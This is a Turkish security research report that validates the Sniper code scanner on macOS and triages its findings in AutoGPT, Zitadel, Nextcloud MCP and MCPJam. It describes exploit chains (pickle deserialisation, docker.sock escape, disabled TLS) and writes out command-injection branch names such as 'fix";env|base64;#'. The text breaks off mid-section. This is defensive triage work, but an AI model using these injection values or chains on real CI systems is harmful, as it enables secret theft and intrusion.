# Gökçe Baran Karakamış — Sniper macOS Kurulum Doğrulaması, Taranan Depolar ve Doğrulanmış Güvenlik Açıkları Raporu

[English](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.en.md) | **Türkçe** | [日本語](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.ja.md) | [简体中文](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.zh-CN.md) | [한국어](SNIPER-SCANNED-REPOSITORIES-AND-ADVISORIES.ko.md)

**Yazar / Güvenlik Araştırmacısı:** **Gökçe Baran Karakamış** ([@dytredline](https://github.com/dytredline))

Bu kapsamlı teknik kılavuz ve güvenlik araştırma raporu üç ana bölümden oluşmaktadır:
1. **Bölüm I — macOS (Apple Silicon) Gerçek Donanım Kurulum ve Çalışma Doğrulama Raporu:** Sniper Community'nin gerçek macOS donanımı üzerinde hem **yerel kaynak kurulumu (`--core-only`)** hem de **Docker Desktop beş motorlu (`community-tools`)** kurulumu ile uçtan uca test ve doğrulama sonuçları.
2. **Bölüm II — Sniper ile Taranan 8 Açık Kaynak Depo, Zafiyet Dönüşüm Mekanizmaları ve Günlük Hayat Senaryoları:** **Gökçe Baran Karakamış** tarafından **Sniper** statik analiz (SAST), altyapı (IaC) ve bağımlılık (SCA) denetim motoru ile taranan **8 açık kaynak deponun** kaynak kodu düzeyinde incelenmesi, yanlış pozitif ayrımı, kod hatalarının hangi koşullarda zafiyete dönüştüğünün herkesin anlayabileceği dilde açıklanması, her depo için **3 gerçek hayat senaryosu (`Senaryo A / B / C`)** ve **örnek çalıştırma/doğrulama komutları**.
3. **Bölüm III — Kendi Sniper Taramamızda Bulduğumuz 11 Doğrulanmış Güvenlik Açığı (`01`..`11`), Kod Analizi, Senaryolar ve Çalışma Zamanı Kanıtları (`RED -> GREEN + BENIGN`):** 6 farklı açık kaynak projede (**Stirling-PDF, TryCua `cua`, OpenZiti, n8n, Gotify Server, NIIS X-Road**) keşfedilen ve GitHub Security Advisory (`GHSA`) olarak bildirilen **11 doğrulanmış güvenlik açığının** kodda nasıl oluştuğu, adım adım nasıl zafiyete dönüştüğü, her biri için **3 somut günlük hayat kritik senaryosu (`Senaryo A / B / C`)**, **örnek çalıştırma/tetikleme komutları** ve **savunma yamaları (`git diff`)**.

---

## Bölüm I — macOS (Apple Silicon) Gerçek Donanım Kurulum ve Doğrulama Raporu (2026-10-24)

macOS (Apple Silicon) üzerinde Sniper kurulumu **deneysel değildir**; hem **yerel kaynak kurulumu (`--core-only`)** hem de **Docker Desktop beş motorlu kurulumu** gerçek macOS donanımı üzerinde test edilmiş, doğrulanmış ve desteklenmektedir:

| Kurulum Yolu | Komut | Gerçek macOS Donanımında Doğrulanan Kapsam | Durum |
| :--- | :--- | :--- | :---: |
| **1. Yerel macOS Kaynak Kurulumu (Native Source Setup)** | `python3 scripts/setup-community --core-only` | `.venv` (CPython 3.12) oluşturma, kilitli çalışma zamanı paketlerinin (`requirements-runtime.lock` + `pip check`) kurulumu, `scripts/sniper-mcp --help`, `scripts/sniper-project-audit --help`, `cli_reports.py --help`, yerel loopback web arayüzü (`127.0.0.1:8787`), yerel SQLite veri dizini başlatma ve örnek proje üzerinde gerçek yerel SAST/veri akışı denetimi (`audit_id: prj_162d09c47587`, `baseline_id: prj_497a1c478d97` — `app.py:4` üzerinde `[critical] Doğrulanmış veri akışı: istek girdisi SQL sorgusuna ulaşıyor (SQL enjeksiyonu)` tespiti ve bildirim kaydı). | **DOĞRULANDI VE DESTEKLENİYOR** |
| **2. macOS Apple Silicon + Docker Desktop Beş Motorlu Kurulum** | `./scripts/deploy-community-tools --accept-third-party-licenses` | SHA-256 özet kilitli 5 yerel motorun (**Nuclei 3.11.1**, **Trivy 0.75.0**, **Gitleaks 8.30.1**, **TruffleHog 3.99.0**, **Opengrep 1.30.1**) çalışma zamanı hazırlık kontrolleri (`precheck_passed`), Türkçe/çok dilli web arayüzü, `./scripts/import-community-project` ile kalıcı proje hacmine (`sniper_projects`) aktarım, 5 motorun tamamında yerel duman testleri ve tam test paketi (**2.826 unittest: 0 hata; 203 pytest geçti; 432 Node testi geçti**). | **DOĞRULANDI VE DESTEKLENİYOR** |

Ayrıntılı İngilizce doğrulama kayıtları için [VALIDATION.md](../VALIDATION.md) ve platform kurulum rehberi için [DEPLOYMENT.md](../DEPLOYMENT.md) belgelerine bakabilirsiniz.

---

## Bölüm II — Sniper ile Taranan 8 Açık Kaynak Depo ve Muhtemel Bağlantılı Açıklar

Her depo için bulgular **(A) Doğrulanmış Tehlikeli Primitive / Sertleştirme Açığı**, **(B) Bağlama/Koşula Bağlı Bulgu ve Bağımlılık (SCA) Kayıtları** ve **(C) Kesin Yanlış Pozitif (Yanlış Alarm)** olarak ayrıştırılmış; ardından her depo için:
1. **Kodda Nasıl Oluştuğu ve Zafiyete Dönüşme Mekanizması (Herkesin Anlayabileceği Açıklama)**,
2. **Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / Senaryo B / Senaryo C`)**,
3. **Örnek Çalıştırma ve Doğrulama Komutları**
ayrıntılı olarak sunulmuştur.

> **Önemli Metodoloji ve Sorumlu Bildirim Notu:** Statik analizde tehlikeli bir fonksiyonun (`exec`, `pickle.loads`, `subprocess.Popen`) veya CI/CD deseninin varlığı tek başına doğrulanmış bir ürün CVE'si anlamına gelmez. Bir bulgunun istismar edilebilir açık sayılması için varsayılan/desteklenen dağıtımda **erişilebilirlik**, **güven sınırı (trust boundary) aşımı** ve **saldırgan önkoşulları** birlikte kanıtlanmalıdır. Doğrulanmış 11 gerçek güvenlik açığı ve çalışma zamanı kanıtları bu belgenin **Bölüm III** kısmında yer almaktadır.

---

## 1. AutoGPT (`autogpt`)
* **SAST/IaC/SCA Özeti:** Politika eşiğini aşan `93` bulgu (`2 kritik, 39 yüksek, 34 orta, 16 düşük, 2 bilgi`); toplam `142` triyaj kaydı (`3 likely_false, 139 uncertain`).

### A. Doğrulanmış Sertleştirme ve Yapılandırma Bulguları
1. **Docker Compose Test/Yerel Ortam Dosyalarında Sabit Sırlar (`CWE-798`):**
   * `autogpt_platform/backend/docker-compose.test.yaml:85` (`RABBITMQ_DEFAULT_PASS`), `docker-compose.journeys.yml:22,29` ve `docker-compose.yml:161`.
2. **Konteyner Güvenlik Sertleştirmesi Eksiklikleri (`CWE-250`, `CWE-1104`):**
   * `autogpt_platform/backend/Dockerfile:1`: Ayrıcalıksız `USER` tanımı olmaması (root olarak çalışma) ve `docker-compose.platform.yml:148` / `docker-compose.yml:121` üzerinde `:latest` imaj etiketleri.

### B. Bağlama Bağlı / İkincil Zincir Bulguları
1. **Veritabanından `pickle.loads` ile Zamanlayıcı Durumu Çözme (`CWE-502`):**
   * `autogpt_platform/backend/backend/executor/jobstore_backfill.py:99`: APScheduler'ın `apscheduler_jobs.job_state` sütunundaki ikili (binary) veriyi `pickle.loads(row.job_state)` ile belleğe yükler.
2. **Sözleşme Sapması (OpenAPI vs Kod):**
   * `autogpt_platform/frontend/src/app/api/openapi.json:3589` ve `backend/api/features/chat/share.py:170,186`: Paylaşılan sohbet uç noktaları (`/{share_token}`) kasıtlı olarak halka açıktır (`public_router`), ancak OpenAPI şemasıyla senkronize değildir.

### C. Kesin Yanlış Pozitifler (`Yanlış Alarm`)
1. **2 Kritiğin İkisi de Yanlış Pozitif (`obj.execute` SQLi Sanılmış):**
   * `autogpt_platform/backend/backend/api/external/v1/routes.py:131` ve `autogpt_platform/backend/backend/api/features/blocks/routes.py:151` — `obj.execute(data, ...)` SQL sorgusu değil, AutoGPT `Block` sınıfının Python metodudur.
2. **JWT Doğrulama Alarmları (`jwt.get_unverified_header`):**
   * `autogpt_platform/autogpt_libs/autogpt_libs/auth/jwt_utils.py:96`, `backend/integrations/webhooks/step_webhooks/service.py:57` ve `backend/copilot/bot/adapters/teams/auth.py:100` — Üçü de `alg` alanını katı izin listesine (`RS256`) karşı doğrulayıp `jwt.decode()` ile tam imza kontrolü yapıyor.
3. **Sözde "Korumasız Rota" Alarmları:**
   * `codex.py:48,70`, `integrations/router.py:942` ve `orgs/team_routes.py:102,168,224,246` — Hepsinde FastAPI `Security(get_user_id)` veya `Security(get_request_context)` + `_authorize_team_management` yetki kontrolü mevcut.
4. **Sözde Sır ve Günlükleme Alarmları:**
   * `autogpt_platform/backend/backend/copilot/tools/ayrshare_managed.py:44` (`NO_API_KEY` İngilizce açıklama metni), `autogpt_platform/single-container/Dockerfile:29` (`BETTER_AUTH_SECRET=build-only-placeholder-not-used-at-runtime`), `oauth.py:452` ve `token_tracking.py:193` (loglara token değeri değil, harcanan LLM kelime/token sayısı `prompt_tokens` yazılıyor).

### D. Kodda Nasıl Oluştuğu ve Zafiyete Dönüşme Mekanizması (Herkesin Anlayabileceği Açıklama)
Python'daki `pickle.loads()` fonksiyonu, kaydedilmiş bir nesneyi geri yüklerken o nesnenin içindeki `__reduce__()` tarifini sorgusuz sualsiz çalıştırır; yani bu fonksiyon veri okumakla kalmaz, verinin içine gizlenmiş işletim sistemi komutlarını da çalıştırabilir. AutoGPT'nin `jobstore_backfill.py:99` dosyasında arka plan görevlerini taşıyan kod şu şekildedir:
```python
# autogpt_platform/backend/backend/executor/jobstore_backfill.py:95-102
for row in rows:
    # apscheduler_jobs tablosundaki ikili (BYTEA) sütunu doğrudan pickle ile çözer
    job_state = pickle.loads(row.job_state)
```
Normal şartlarda dışarıdaki bir web kullanıcısı bu tabloya doğrudan veri yazamaz; bu yüzden tek başına doğrudan bir uzaktan kod çalıştırma (RCE) açığı değildir. **Ancak** sistem yöneticisi `docker-compose.yml` içindeki varsayılan veritabanı/RabbitMQ parolalarını değiştirmeden iç ağa açarsa veya uygulamada başka bir SQL enjeksiyonu / veritabanı sızıntısı yaşanırsa, saldırgan `apscheduler_jobs.job_state` sütununa zararlı bir `pickle` yükü yazar. Arka plan zamanlayıcısı (`executor`) bu satırı okuduğu anda `Dockerfile`'da `USER` kısıtlaması olmadığı için **konteyner içinde doğrudan `root` yetkisiyle** rastgele komut çalıştırır.

### E. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — İç Ağda Varsayılan Compose Parolalarıyla Çalışan Kurulumda Veritabanı Üzerinden `root` RCE Zinciri:**
  1. Bir geliştirme ekibi AutoGPT Platformu'nu şirket içi bir sunucuda varsayılan `docker-compose.yml` ayarlarıyla ayağa kaldırır ve PostgreSQL portu iç ağdan erişilebilir kalır.
  2. İç ağdaki yetkisiz bir kullanıcı veya ele geçirilmiş başka bir servis, varsayılan kimlik bilgileriyle veritabanına bağlanıp `apscheduler_jobs` tablosundaki `job_state` alanına `os.system` içeren serileştirilmiş bir Python `pickle` nesnesi yazar.
  3. AutoGPT arka plan işçisi (`jobstore_backfill.py:99`) tabloyu taradığında `pickle.loads(row.job_state)` çalışır ve konteyner `root` kullanıcısıyla çalıştığı için tüm LLM API anahtarları (`OPENAI_API_KEY`, `ANTHROPIC_API_KEY`) ele geçirilir.
* **Senaryo B — `:latest` Etiketli Bağımlı Konteyner İmajlarının Tedarik Zinciri Kayması:**
  1. Üretim ortamında `docker-compose.platform.yml` içindeki `:latest` etiketli imajlar kullanılır ve otomatik yeniden başlatma sırasında yeni bir üst imaj çekilir.
  2. Sabit SHA-256 özet (digest) veya sürüm kilidi olmadığı için, beklenmeyen bir kırıcı değişiklik veya bozulmuş üst paket üretime doğrudan yansır.
* **Senaryo C — OpenAPI Şeması ile Gerçek Kod Arasındaki Sözleşme Sapması Nedeniyle Paylaşılan Sohbetlerin Yanlışlıkla İfşası:**
  1. Güvenlik ekibi yalnızca `openapi.json` şemasını inceleyerek tüm sohbet uç noktalarının kimlik doğrulaması gerektirdiğini varsayar ve API ağ geçidini (API Gateway) buna göre yapılandırır.
  2. Oysa `backend/api/features/chat/share.py:170,186` altındaki `/{share_token}` uç noktaları `public_router` üzerinde kayıtlıdır; paylaşım bağlantısını bilen herkes oturum açmadan paylaşılan ajan çıktılarını okuyabilir.

### F. Tek Başına ve Birlikte Kritiklik / Birleşme (Chaining) Analizi
* **Tek Başına Kritiklik:** **Düşük / Orta.** Raporlanan 2 kritik SQLi tamamen yanlış pozitiftir; doğrulanmış bir dış RCE/SQLi açığı yoktur.
* **Birleşiyor mu? (Koşullu Saldırı Hipotezi — Birlikte Kritiklik: ORTA / YÜKSEK [Yalnızca DB Yazma Erişimi Varsa]):** `jobstore_backfill.py:99` içindeki `pickle.loads`, varsayılan compose parolaları ve `root` konteyner ile birleştiğinde veritabanı yazma erişimini tam sistem hakimiyetine dönüştürür.

### G. Örnek Çalıştırma ve Doğrulama Komutları
```bash
# 1. AutoGPT deposu üzerinde Sniper tam kapsamlı SAST/IaC/SCA denetimini çalıştırma
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/autogpt" \
  --output-json "$HOME/audit-targets/reports/autogpt-audit.json"

# 2. Yanlış pozitif olan obj.execute çağrıları ile gerçek pickle.loads kullanımını doğrulama
grep -rn "pickle.loads" "$HOME/audit-targets/autogpt/autogpt_platform/backend/"
grep -rn "def execute(" "$HOME/audit-targets/autogpt/autogpt_platform/backend/backend/data/block.py"

# 3. Sniper CLI üzerinden politika eşiğini aşan bulguları özetleme
python3 cli_reports.py --input "$HOME/audit-targets/reports/autogpt-audit.json" --min-severity medium
```

---

## 2. Zitadel (`zitadel`)
* **SAST/IaC/SCA Özeti:** Politika eşiğini aşan `67` bulgu (`8 kritik, 42 yüksek, 5 orta, 11 düşük, 1 bilgi`); toplam `286` triyaj kaydı (`3 likely_true, 283 uncertain`).

### A. Doğrulanmış Sertleştirme ve Örnek Dağıtım Bulguları
1. **Örnek Compose Dosyalarında Docker Soket Bağlama (`docker.sock`):**
   * `deploy/compose/` altındaki üç compose varyantında `/var/run/docker.sock` bağlaması bulunmaktadır (tek bir kök nedenin üç varyantta tekrarı).
2. **Dokümantasyon Ters Vekil Örneğinde `NODE_TLS_REJECT_UNAUTHORIZED=0` ve Başlangıç Yoklaması:**
   * `apps/docs/content/self-hosting/manage/reverseproxy/docker-compose.yaml:154` içinde `NODE_TLS_REJECT_UNAUTHORIZED=0` tanımlıdır (dokümantasyon örneği; `deploy/compose/` dosyalarından ayrıdır).
   * `apps/login/scripts/server.mjs:45`: `pollReady()` yerel başlangıç sağlık kontrolünde `rejectUnauthorized: false` kullanılıyor.

### B. Bağlama Bağlı Bulgular
* **İsteğe Bağlı Şifresiz OpenTelemetry (OTLP) gRPC/HTTP İhracı (`CWE-319`):**
   * `logger.go:94,110`, `metric.go:269,290` ve `tracing.go:214,230`: Yalnızca yönetici yapılandırmada `cfg.Insecure = true` seçerse `WithInsecure()` etkinleşir.

### C. Kesin Yanlış Pozitifler (`Yanlış Alarm`)
1. **8 Kritiğin Tamamı Yanlış Pozitif:**
   * `backend/v3/storage/database/dialect/postgres/conn.go:46`, `pool.go:54`, `tx.go:59`: `pgx` veritabanı sürücüsünün parametreli `QueryRow(ctx, sql, args...)` sarmalayıcılarıdır. HTTP log ara katmanındaki `r.Method` değeri genel `Info()`/`Add()` metot isimleri üzerinden yanlışlıkla buraya bağlanmıştır.
   * `cmd/initialise/helper.go:12` ve `cmd/initialise/verify_database.go:79`: Başlangıç veritabanı kurulumundaki `exec(ctx, db, ...)` SQL yardımcı fonksiyonudur; dinamik kod çalıştırma (`eval`/`exec`) değildir.
2. **Yüksek Önemli "SQL Sorgusunda Veri Birleştirme" Alarmları:**
   * `internal/api/grpc/user/query.go:125`, `v2/convert/user.go:169,175,181` ve `intent_test.go:296`: Protobuf arama nesnelerini (`AndQuery`, `OrQuery`, `NotQuery`) iç sorgu yapılarına dönüştüren Go fonksiyonlarıdır; ortada SQL string birleştirme yoktur (`intent_test.go:296`'da ise `authUrl.Scheme+"://"+authUrl.Host` URL birleştirmesi SQL sanılmıştır).
3. **Test Dosyalarındaki Sabit Parola Test Verileri:** `password-complexity.test.tsx`, `validators.test.ts`, `password_test.go` içindeki parola karmaşıklığı birim testi dizgileridir.

### D. Kodda Nasıl Oluştuğu ve Zafiyete Dönüşme Mekanizması (Herkesin Anlayabileceği Açıklama)
Zitadel bir kimlik ve erişim yönetimi (IAM / SSO) sunucusudur. Çekirdek Go kodunda veritabanı sorguları parametreli `pgx` sürücüsüyle güvenli biçimde çalışmaktadır. Ancak örnek dağıtım ve dokümantasyon dosyalarında iki ayrı tehlikeli yapılandırma kalıbı yer alır:
1. `deploy/compose/` altındaki örneklerde konteyner içine `/var/run/docker.sock` bağlanması: Linux'ta Docker soketine yazma erişimi olan herhangi bir süreç, konak (host) makinede yeni bir ayrıcalıklı (`--privileged`) konteyner başlatarak konak işletim sisteminin `root` kullanıcısı olabilir.
2. `apps/docs/content/self-hosting/manage/reverseproxy/docker-compose.yaml:154` satırında Node.js tabanlı yeni giriş arayüzü (`zitadel-login`) için `NODE_TLS_REJECT_UNAUTHORIZED=0` verilmesi: Bu ortam değişkeni Node.js'in tüm HTTPS bağlantılarında TLS sertifika doğrulamasını tamamen kapatır.
Eğer bir sistem yöneticisi dokümantasyondaki bu satırı kopyalayıp gerçek üretim ortamında `zitadel-login` ile arka uç Zitadel API'si farklı makinelerdeyken kullanırsa, araya giren (MITM) bir saldırgan sahte sertifikayla OAuth2/OIDC oturum açma trafiğini dinleyebilir.

### E. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Dokümantasyondaki Ters Vekil Örneğini Kopyalayan Operatörün `NODE_TLS_REJECT_UNAUTHORIZED=0` İle Üretime Çıkması:**
  1. Bir DevOps mühendisi Zitadel'i kendi sunucusunda kurarken resmi dokümantasyondaki `reverseproxy/docker-compose.yaml` dosyasını şablon olarak kopyalar ve `NODE_TLS_REJECT_UNAUTHORIZED=0` satırını fark etmeden üretimde bırakır.
  2. `zitadel-login` konteyneri ile arka uç kimlik doğrulama servisi veya dış OIDC sağlayıcıları arasındaki TLS bağlantılarında sertifika kontrolü devre dışı kalır.
  3. Ağ katmanında ARP/DNS zehirlemesi yapabilen bir saldırgan, sahte bir TLS sertifikası sunarak kullanıcıların girdiği parolaları ve oturum jetonlarını düz metin olarak yakalar.
* **Senaryo B — Paylaşımlı Sunucuda `docker.sock` Bağlı Compose Örneğiyle Konteynerden Konağa Kaçış:**
  1. Geliştirme veya küçük ölçekli üretim ortamında `deploy/compose/` altındaki şablon doğrudan çalıştırılır ve `/var/run/docker.sock` konteyner içine bağlanır.
  2. İlgili yardımcı konteynerde meydana gelebilecek herhangi bir ikincil zafiyet veya yanlış yapılandırma sonucunda saldırgan `docker.sock` üzerinden konak makinenin `/etc/shadow` ve tüm diğer konteyner sırlarına `root` olarak erişir.
* **Senaryo C — `cfg.Insecure = true` ile Açılan OpenTelemetry Hattından Hassas İzleme Verisi Sızıntısı:**
  1. Hata ayıklama amacıyla `tracing.go:214` / `logger.go:94` içinde OTLP ihracı `Insecure: true` olarak ayarlanır ve merkezi gözlemlenebilirlik sunucusuna şifresiz gRPC üzerinden gönderilir.
  2. Aynı veri merkezi ağındaki dinleyiciler, kimlik doğrulama akışlarına ait meta verileri ve kullanıcı kimliklerini şifresiz trafikten okuyabilir.

### F. Tek Başına ve Birlikte Kritiklik / Birleşme (Chaining) Analizi
* **Tek Başına Kritiklik:** **Düşük / Orta.** Zitadel çekirdek Go/TypeScript kodunda istismar edilebilir SQLi veya RCE yoktur.
* **Birleşiyor mu?** `docker.sock` bağlaması (`deploy/compose/`) ile `NODE_TLS_REJECT_UNAUTHORIZED=0` (`apps/docs/.../reverseproxy/docker-compose.yaml`) **farklı compose örneklerindedir**; dolayısıyla varsayılan olarak tek bir dosyada birleşmezler. Ancak bir operatör kendi üretim ortamında bu örnekleri birleştirerek kullanırsa risk katlanır.

### G. Örnek Çalıştırma ve Doğrulama Komutları
```bash
# 1. Zitadel deposu üzerinde Sniper SAST/IaC denetimini çalıştırma
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/zitadel" \
  --output-json "$HOME/audit-targets/reports/zitadel-audit.json"

# 2. Compose dosyalarındaki docker.sock ve NODE_TLS_REJECT_UNAUTHORIZED=0 satırlarını doğrulama
grep -rn "docker.sock" "$HOME/audit-targets/zitadel/deploy/compose/"
grep -rn "NODE_TLS_REJECT_UNAUTHORIZED" "$HOME/audit-targets/zitadel/apps/docs/"

# 3. pgx parametreli sorgu sarmalayıcılarını inceleyerek yanlış pozitifleri teyit etme
sed -n '40,65p' "$HOME/audit-targets/zitadel/backend/v3/storage/database/dialect/postgres/conn.go"
```

---

## 3. Nextcloud MCP Server (`nextcloud-mcp-v0.201.0-8064f66`)
* **SAST/IaC/SCA Özeti:** Politika eşiğini aşan `59` bulgu (`SAST: 1 kritik, 6 yüksek, 36 orta, 2 düşük` · `IaC: 7 yüksek, 1 bilgi` · `SCA: 5 kritik, 40 yüksek, 30 orta`).

### A. Doğrulanmış Sertleştirme Bulguları
1. **CI/CD `.github/workflows/pact.yml:93` Dal Adı Kabuk İnterpolasyonu (`CWE-78` — Aynı-Repo Sınırlı Sertleştirme):**
   * `.github/workflows/pact.yml:93` satırında `--branch "${{ github.head_ref || github.ref_name }}"` doğrudan `run:` kabuk betiğine yazılmıştır.
   * **Kanıt Denetimi Düzeltmesi:** İş akışı `pull_request_target` **kullanmamaktadır** (tetikleyici `pull_request` ve `push`'tur) ve `satır 35` ile `102`'de `if: ${{ github.event_name == 'push' || github.event.pull_request.head.repo.full_name == github.repository }}` kontrolü bulunduğu için **dış çatal (fork) PR'larda çalışmaz**. Dolayısıyla dış saldırganın fork PR üzerinden sır çalma zinciri yoktur; yalnızca depo içi dal adları için kabuk sertleştirmesi konusudur.

### B. Bağlama Bağlı Bulgular ve SCA Kayıtları
* **Test/Geliştirme Ortamı Sabit Sırları:** `docker-compose.yml` ve `app-hooks/post-installation/15-setup-keycloak-provider.sh` / `scripts/provision-greenmail-account.sh` yerel test/geliştirme ortamı kurulum betikleridir.
* **SCA Bağımlılık Kayıtları (`uv.lock`):** `pillow 11.3.0`, `pyjwt 2.13.0`, `certifi 2026.6.17`, `cryptography 49.0.0`, `fsspec 2026.4.0` kayıtları.

### C. Kesin Yanlış Pozitifler (`Yanlış Alarm`)
1. **Login Flow v2 `poll.endpoint` SSRF Alarmı (`login_flow.py:192` — Uçtan Uca Çağrı Zinciriyle Yanlış Pozitif Olduğu Kanıtlandı):**
   * `nextcloud_mcp_server/auth/login_flow.py:173-195` içindeki `poll(self, poll_endpoint: str, poll_token: str)` metodunun tüm depodaki tek çağrıcıları `provision_routes.py:102` (`_poll_and_store`) ve `server/auth_tools.py:304` (`nc_auth_check_status`) fonksiyonlarıdır.
   * Her iki çağrıcı da `poll_endpoint` değerini dış kullanıcı girdisinden değil, `flow_client.initiate()` çıktısından (`login_flow.py:125-151`) alır.
   * `initiate()` metodu ise `login_flow.py:130` satırında **`poll_endpoint = self._rewrite_to_nextcloud_host(raw_poll_endpoint)`** çağrısıyla URL'nin `scheme` ve `netloc` (`host:port`) alanlarını sunucu yapılandırmasındaki sabit `self.nextcloud_host` ile **zorla üzerine yazmaktadır** (`rewrite_url_origin`). Dolayısıyla `poll()` metodunun başka bir sunucuya/iç IP'ye SSRF isteği göndermesi imkansızdır.
2. **JWT İmza Doğrulaması Alarmı (`token_utils.py:178`):** `nextcloud_mcp_server/auth/token_utils.py:178-205` — `jwt.get_unverified_header(id_token)` yalnızca JWKS anahtar kümesinden `kid` seçmek için kullanılmakta, hemen ardından OIDC algoritma izin listesiyle tam imza doğrulaması yapılmaktadır.

### D. Kodda Nasıl Oluştuğu ve Zafiyete Dönüşme Mekanizması (Herkesin Anlayabileceği Açıklama)
GitHub Actions iş akışlarında `${{ github.head_ref }}` gibi ifadeler, bash betiği çalışmadan **önce** metin olarak yapıştırılır (macro expansion). `.github/workflows/pact.yml:93` satırında şu ifade yer alır:
```yaml
# .github/workflows/pact.yml:90-95
- name: Publish Pact
  run: |
    pact-broker publish ./pacts \
      --consumer-app-version "${{ github.sha }}" \
      --branch "${{ github.head_ref || github.ref_name }}"
```
Eğer bir dal adı `feat/$(id)` veya `feat";curl ...;#` gibi kabuk özel karakterleri içeriyorsa, bash çift tırnak (`"..."`) içindeki `$(...)` veya `"` karakterlerini komut olarak yorumlar. Şu anki dosyada `github.event.pull_request.head.repo.full_name == github.repository` şartı olduğu için dışarıdan bir GitHub kullanıcısı fork açıp bunu tetikleyemez. **Ancak** ileride bir geliştirici dış PR'lar için Pact testlerini açmak adına bu `if:` koşulunu kaldırırsa veya depo içinde dal açma yetkisi olan kısıtlı bir hesap/bot ele geçirilirse, dal adı üzerinden CI ortamındaki `PACT_BROKER_TOKEN` ve depo sırları çalınabilir.

### E. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Depoya Yazma Yetkisi Olan Kısıtlı Bir Hesabın Dal Adıyla Korumalı CI Sırlarını Sızdırması:**
  1. Organizasyonda yalnızca alt dal (feature branch) açma yetkisi olan ancak `main` dalına veya GitHub Actions Secrets ayarlarına erişimi bulunmayan bir hesap ele geçirilir.
  2. Saldırgan `fix";env|base64;#` adında bir dal gönderdiğinde (`git push`), `pact.yml:93` içindeki kabuk interpolasyonu tetiklenir ve CI çalışma zamanındaki gizli anahtarlar loglara veya dış sunucuya aktarılır.
* **Senaryo B — Yerel Test Ortamı Betiklerindeki (`15-setup-keycloak-provider.sh`) Sabit Sırların Üretim Ortamına Kopyalanması:**
  1. Nextcloud MCP sunucusunu OIDC/Keycloak ile entegre etmek isteyen bir sistem yöneticisi, depodaki `docker-compose.yml` ve `15-setup-keycloak-provider.sh` betiğini değiştirmeden kendi sunucusunda çalıştırır.
  2. Betik içindeki sabit `client_secret` ve yönetici parolaları üretim Keycloak örneğinde aktif kalır; depoyu bilen herhangi bir kişi OAuth istemcisini taklit edebilir.
* **Senaryo C — `uv.lock` İçindeki Güncel Olmayan `pillow` ve `cryptography` Paketlerinin Görsel İşleme Sırasında Tetiklenmesi:**
  1. Nextcloud MCP sunucusu, kullanıcının Nextcloud hesabındaki görselleri ve belgeleri AI ajanına özetlemek için `pillow` kütüphanesiyle işler.
  2. `uv.lock` dosyasındaki eski bağımlılık sürümleri güncellenmeden dağıtıldığında, paylaşılan bir klasöre yüklenen bozuk (malformed) bir görsel dosyası bilinen bellek hatasını tetikleyerek MCP sunucusunu çökertebilir.

### F. Tek Başına ve Birlikte Kritiklik / Birleşme (Chaining) Analizi
* **Tek Başına ve Birlikte Kritiklik:** **Düşük (Sertleştirme).** Hem `pact.yml` dış fork'lara kapalıdır hem de `login_flow.py:192` `initiate()` aşamasında `self.nextcloud_host` origin'ine sabitlendiği için SSRF oluşturmaz. Depoda birleşen veya dışarıdan istismar edilebilen bir SAST açığı yoktur.

### G. Örnek Çalıştırma ve Doğrulama Komutları
```bash
# 1. Nextcloud MCP deposu üzerinde Sniper SAST/IaC/SCA denetimini çalıştırma
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/nextcloud-mcp-v0.201.0-8064f66" \
  --output-json "$HOME/audit-targets/reports/nextcloud-mcp-audit.json"

# 2. login_flow.py içinde _rewrite_to_nextcloud_host origin sabitlemesini doğrulama
sed -n '125,195p' "$HOME/audit-targets/nextcloud-mcp-v0.201.0-8064f66/nextcloud_mcp_server/auth/login_flow.py"

# 3. pact.yml içindeki same-repo koşulunu ve kabuk interpolasyonunu inceleme
sed -n '30,105p' "$HOME/audit-targets/nextcloud-mcp-v0.201.0-8064f66/.github/workflows/pact.yml"
```

---

## 4. MCPJam Inspector (`mcpjam-inspector-v3.9.2-eda1fd1`)
* **SAST/IaC/SCA Özeti:** Politika eşiğini aşan `122` bulgu (`SAST: 12 kritik, 8 yüksek, 74 orta, 6 düşük` · `IaC: 2 orta, 3 bilgi` · `SCA: 6 kritik, 96 yüksek, 197 orta, 40 düşük`).

### A. Doğrulanmış Sertleştirme Bulguları
1. **CI/CD `.github/workflows/pr-preview.yml:116` Dal Adı Kabuk İnterpolasyonu (`Aynı-Repo Sınırlı`):**
   * `.github/workflows/pr-preview.yml:116` satırında `echo "branch=${{ github.event.pull_request.head.ref }}" >> "$GITHUB_OUTPUT"` doğrudan kabuk içinde çalıştırılmaktadır.
   * **Kanıt Denetimi Düzeltmesi:** `pr-preview.yml` içinde `pull_request_target` **yoktur** (tetikleyici `pull_request` ve `repository_dispatch`'tir) ve `satır 65-69`'da `github.event.pull_request.head.repo.full_name == github.repository` ile `dependabot[bot]` dışlaması mevcuttur. Yani dış çatal (fork) PR'lar bu işi tetikleyemez; yalnızca aynı depoda dal açma yetkisi olan kullanıcılar için geçerli bir kabuk sertleştirmesidir.

### B. Bağlama Bağlı Bulgular ve SCA Kayıtları
* **`dependabot-auto-merge.yml:25` (`pull_request_target`):** `.github/workflows/dependabot-auto-merge.yml:15-40` dosyasında `pull_request_target` kullanılmaktadır; ancak dosya içindeki açık güvenlik yorumunda da belirtildiği üzere **hiçbir `actions/checkout` adımı yoktur** ve `if: github.event.pull_request.user.login == 'dependabot[bot]'` ile sınırlandırılmıştır.
* **SCA Bağımlılık Kayıtları (`package-lock.json`):** `handlebars 4.7.9`, `shell-quote 1.10.0`, `tinypool 1.1.1`, `@modelcontextprotocol/sdk` kayıtları.

### C. Kesin Yanlış Pozitifler (`Yanlış Alarm — 20 Kritik/Yüksek SAST Bulgusunun 18'i`)
1. **Yorum Satırlarlarındaki `eval (` ve `exec (` Kelimeleri (11 Kritik + 3 Yüksek Yanlış Alarm):**
